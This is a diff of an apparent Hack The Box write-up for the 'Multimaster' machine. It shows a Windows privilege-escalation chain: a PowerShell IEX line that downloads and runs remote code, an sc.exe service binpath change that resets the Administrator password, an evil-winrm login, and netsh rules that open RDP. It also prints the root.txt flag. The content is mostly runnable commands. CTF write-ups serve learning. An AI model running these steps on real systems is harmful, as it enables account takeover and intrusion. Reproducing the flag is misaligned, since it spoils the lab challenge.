@@ -24,7 +24,42 @@ powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubuser
 As we can see that we have access to sc
 ![[Pasted image 20241008072610.png]]
 
-
+So i reset the box simply as instead of getting a reverse shell why don't we directly change the password aka administrator simply
+```
+sc.exe config browser binpath="C:\Windows\System32\cmd.exe /C net user Administrator HolaA123!!"
 ```
 
 ```
+sc.exe qc browser
+```
+
+```
+sc.exe stop browser
+```
+
+```
+sc.exe start browser
+```
+
+
+```
+evil-winrm -i multimaster.htb -u Administrator -p 'HolaA123!!'
+```
+
+Now we simply have to copy the root.txt but we can also get the RDP
+
+```
+netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
+```
+
+```
+netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=out localport=3389 action=allow
+```
+
+Root.txt
+```
+0058fcf18700544a2e17712f784fa6a9
+```
+
+![[Pasted image 20241012003036.png]]
+
